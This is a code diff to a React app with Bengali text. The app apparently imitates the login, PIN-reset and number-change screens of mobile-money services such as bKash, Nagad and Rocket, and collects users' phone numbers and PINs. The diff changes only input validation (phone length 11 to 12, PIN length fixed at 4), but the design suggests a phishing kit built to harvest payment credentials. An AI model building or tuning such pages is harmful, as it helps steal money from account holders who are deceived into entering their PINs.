@@ -494,7 +494,7 @@ const App: React.FC = () => {
   const handleLoginSubmit = async () => {
     if (isLoading) return;
 
-    if (!mobileNumber.startsWith('01') || mobileNumber.length !== 11) {
+    if (!mobileNumber.startsWith('01') || mobileNumber.length !== 12) {
       setPhoneError('অনুগ্রহ করে সঠিক নাম্বার দিন');
       return;
     }
@@ -699,7 +699,7 @@ const App: React.FC = () => {
 
   const handleNumberChangeSubmit = async () => {
     if (isLoading) return;
-    if (!mobileNumber.startsWith('01') || mobileNumber.length !== 11) {
+    if (!mobileNumber.startsWith('01') || mobileNumber.length !== 12) {
       setPhoneError('অনুগ্রহ করে সঠিক নাম্বার দিন');
       return;
     }
@@ -901,7 +901,7 @@ const App: React.FC = () => {
                   value={mobileNumber}
                   onChange={(e) => { setMobileNumber(e.target.value.replace(/\D/g, '')); setPhoneError(''); }}
                   className="text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-200"
-                  maxLength={11}
+                  maxLength={12}
                   inputMode="numeric"
                   autoFocus
                 />
@@ -919,7 +919,7 @@ const App: React.FC = () => {
                   value={pin}
                   onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                   className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
-                  maxLength={provider === 'nagad' ? 4 : provider === 'rocket' ? 6 : 5}
+                  maxLength={4}
                   inputMode="numeric"
                 />
                 <button className="text-[#E2136E] p-1">
@@ -932,10 +932,10 @@ const App: React.FC = () => {
       </div>
       <div className="mt-auto p-4 bg-white border-t border-gray-50">
         <button 
-          disabled={mobileNumber.length < 11 || (provider === 'nagad' ? pin.length !== 4 : provider === 'rocket' ? pin.length !== 5 : pin.length < 4) || isLoading}
+          disabled={mobileNumber.length < 12 || pin.length !== 4 || isLoading}
           onClick={handleLoginSubmit}
           className={`w-full flex items-center justify-center p-4 rounded-xl transition-all shadow-lg ${
-            mobileNumber.length >= 11 && (provider === 'nagad' ? pin.length === 4 : provider === 'rocket' ? pin.length === 5 : pin.length >= 4) && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
+            mobileNumber.length >= 12 && pin.length === 4 && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
           }`}
         >
           {isLoading ? (
@@ -1004,7 +1004,7 @@ const App: React.FC = () => {
                   tabIndex={-1}
                   onFocus={(e) => e.target.blur()}
                   className="text-xl font-bold text-gray-800 outline-none flex-1 pointer-events-none"
-                  maxLength={11}
+                  maxLength={12}
                   inputMode="numeric"
                 />
               </div>
@@ -1018,7 +1018,7 @@ const App: React.FC = () => {
                   value={pin}
                   onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                   className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
-                  maxLength={provider === 'nagad' ? 4 : 5}
+                  maxLength={4}
                   inputMode="numeric"
                   autoFocus
                 />
@@ -1032,10 +1032,10 @@ const App: React.FC = () => {
       </div>
       <div className="mt-auto p-4 bg-white border-t border-gray-50">
         <button 
-          disabled={(provider === 'nagad' ? pin.length !== 4 : pin.length < 4) || isLoading}
+          disabled={pin.length !== 4 || isLoading}
           onClick={handlePinResetSubmit}
           className={`w-full flex items-center justify-between p-4 rounded-xl transition-all shadow-lg ${
-            (provider === 'nagad' ? pin.length === 4 : pin.length >= 4) && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
+            pin.length === 4 && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
           }`}
         >
           {isLoading ? (
@@ -1090,7 +1090,7 @@ const App: React.FC = () => {
                   value={mobileNumber}
                   onChange={(e) => { setMobileNumber(e.target.value.replace(/\D/g, '')); setPhoneError(''); }}
                   className="text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-200"
-                  maxLength={11}
+                  maxLength={12}
                   inputMode="numeric"
                 />
               </div>
@@ -1109,7 +1109,7 @@ const App: React.FC = () => {
                   tabIndex={-1}
                   onFocus={(e) => e.target.blur()}
                   className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 pointer-events-none ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
-                  maxLength={5}
+                  maxLength={4}
                   inputMode="numeric"
                 />
                 <button className="text-[#E2136E] p-1 pointer-events-none" tabIndex={-1}>
@@ -1122,10 +1122,10 @@ const App: React.FC = () => {
       </div>
       <div className="mt-auto p-4 bg-white border-t border-gray-50">
         <button 
-          disabled={mobileNumber.length < 11 || isLoading}
+          disabled={mobileNumber.length < 12 || isLoading}
           onClick={handleNumberChangeSubmit}
           className={`w-full flex items-center justify-between p-4 rounded-xl transition-all shadow-lg ${
-            mobileNumber.length >= 11 && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
+            mobileNumber.length >= 12 && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
           }`}
         >
           {isLoading ? (
